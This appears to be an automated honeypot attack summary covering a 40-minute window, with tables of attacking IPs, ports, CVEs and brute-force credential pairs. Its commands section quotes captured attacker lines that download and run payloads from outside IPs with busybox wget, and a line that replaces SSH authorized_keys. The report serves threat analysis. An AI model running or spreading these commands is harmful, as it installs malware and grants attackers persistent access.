
# Honeypot Attack Summary Report

## Report Information
- **Report Date:** 2025-09-29T07:01:23Z
- **Reporting Period:** 2025-09-29T06:20:01Z to 2025-09-29T07:00:01Z
- **Total Events Analyzed:** 13,719

## Executive Summary
This report summarizes the analysis of 13,719 events captured by a distributed network of honeypots over a 40-minute period on September 29, 2025. The data reveals a high volume of automated attacks, with the majority targeting SSH services. The most prominent attack vectors include brute-force login attempts and exploitation of known vulnerabilities.

Key findings include:
- **High Attack Volume:** A total of 13,719 attacks were recorded, indicating a persistent and high level of malicious activity.
- **Dominance of SSH-based Attacks:** The Cowrie honeypot, which emulates an SSH server, captured the highest number of events (7,844), accounting for over 57% of all attacks. This highlights the continued focus of attackers on compromising SSH services.
- **Geographic Distribution of Attackers:** The attacks originated from a wide range of IP addresses globally. The most active IP addresses were `103.140.127.215`, `106.14.67.229`, and `20.2.136.52`.
- **Targeted Vulnerabilities:** Attackers were observed attempting to exploit several vulnerabilities, with a significant focus on CVE-2021-44228 (Log4Shell).
- **Common Commands and Payloads:** A variety of post-exploitation commands were observed, including reconnaissance commands (`uname`, `whoami`), and attempts to download and execute malicious payloads.

This report provides a detailed analysis of the observed attacks, offering insights into the tactics, techniques, and procedures (TTPs) of current threat actors.

## Detailed Analysis

### Attacks by Honeypot
The following table shows the distribution of attacks across the different honeypots:

| Honeypot | Attack Count | Percentage |
|---|---|---|
| Cowrie | 7,844 | 57.18% |
| Honeytrap | 2,356 | 17.17% |
| Suricata | 1,530 | 11.15% |
| Ciscoasa | 1,464 | 10.67% |
| Sentrypeer | 260 | 1.89% |
| Mailoney | 66 | 0.48% |
| Dionaea | 57 | 0.42% |
| Tanner | 32 | 0.23% |
| ssh-rsa | 30 | 0.22% |
| H0neytr4p | 20 | 0.15% |
| Adbhoney | 16 | 0.12% |
| Honeyaml | 15 | 0.11% |
| Redishoneypot| 12 | 0.09% |
| Ipphoney | 7 | 0.05% |
| ConPot | 4 | 0.03% |
| Dicompot | 4 | 0.03% |
| Wordpot | 2 | 0.01% |

### Top 20 Attacking IP Addresses
The following IP addresses were the most active during the reporting period:

| IP Address | Attack Count |
|---|---|
| 103.140.127.215 | 1248 |
| 106.14.67.229 | 1244 |
| 20.2.136.52 | 1258 |
| 43.163.91.110 | 882 |
| 196.251.88.103 | 808 |
| 147.45.193.115 | 601 |
| 185.156.73.166 | 377 |
| 185.156.73.167 | 377 |
| 92.63.197.55 | 362 |
| 92.63.197.59 | 338 |
| 208.109.190.200 | 197 |
| 212.83.165.218 | 244 |
| 87.201.127.149 | 282 |
| 51.161.32.24 | 243 |
| 196.251.80.29 | 143 |
| 172.245.163.134 | 93 |
| 80.75.212.83 | 96 |
| 129.13.189.204 | 65 |
| 196.251.80.75 | 102 |
| 3.134.148.59 | 44 |

### Top 20 Targeted Ports
The following ports were most frequently targeted by attackers:

| Port | Protocol | Attack Count |
|---|---|---|
| 22 | TCP | 1457 |
| 5060 | UDP/TCP | 260 |
| 8333 | TCP | 103 |
| 25 | TCP | 66 |
| 80 | TCP | 36 |
| 23 | TCP | 19 |
| 9000 | TCP | 29 |
| 443 | TCP | 22 |
| 9090 | TCP | 23 |
| 8888 | TCP | 18 |
| 8800 | TCP | 22 |
| 2000 | TCP | 8 |
| 9922 | TCP | 19 |
| 22222 | TCP | 18 |
| 22225 | TCP | 16 |
| 3306 | TCP | 6 |
| 8728 | TCP | 6 |
| 37215 | TCP | 6 |
| 12321 | TCP | 9 |
| 8088 | TCP | 11 |

### Observed CVEs
The following CVEs were detected in attack payloads:

| CVE | Count |
|---|---|
| CVE-2021-44228 | 43 |
| CVE-2022-27255 | 17 |
| CVE-2019-12263, CVE-2019-12261, CVE-2019-12260, CVE-2019-12255 | 5 |
| CVE-2019-11500 | 4 |
| CVE-2021-3449 | 4 |
| CVE-2002-0013, CVE-2002-0012, CVE-1999-0517 | 1 |
| CVE-2002-0013, CVE-2002-0012 | 1 |
| CVE-2006-2369 | 1 |


### Top 20 Credentials Used in Brute-Force Attacks
The following username/password combinations were most frequently used in brute-force attacks:

| Username/Password | Count |
|---|---|
| root/ | 30 |
| ftpuser/ftpuser | 5 |
| 345gs5662d34/345gs5662d34 | 8 |
| user/user | 4 |
| root/Aa123456 | 4 |
| kubernetes/kubernetes | 4 |
| bot/bot | 4 |
| dev/dev | 4 |
| root/!Q2w3e4r | 4 |
| plexserver/plexserver | 4 |
| root/root123 | 4 |
| nvidia/nvidia | 4 |
| uftp/uftp | 4 |
| gitlab-runner/gitlab-runner | 4 |
| ubnt/ubnt | 4 |
| dev/dev123456 | 4 |
| git/123 | 4 |
| ftpuser/ftpuser123 | 4 |
| steam/steam123 | 4 |
| es/es | 4 |

### Observed Commands and Payloads
Attackers executed a variety of commands after successful or attempted breaches. The most common commands are listed below:

**System Reconnaissance:**
- `uname -a`
- `whoami`
- `lscpu | grep Model`
- `cat /proc/cpuinfo | grep name | wc -l`
- `free -m`
- `df -h`
- `w`

**Malware Download and Execution:**
- `cd /data/local/tmp/; rm *; busybox wget http://94.154.35.154/arm.urbotnetisass; ...`
- `cd /data/local/tmp/; busybox wget http://64.188.8.180/w.sh; sh w.sh; ...`

**SSH Key Manipulation:**
- `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ..." >> .ssh/authorized_keys`

## Notes and Limitations
The data in this report is based on observations from a network of honeypots. Honeypots are designed to attract and record malicious activity, but the data may not be representative of all attack traffic on the internet. The information presented here should be used to understand emerging threats and attacker methodologies, but should not be considered an exhaustive list of all ongoing threats.
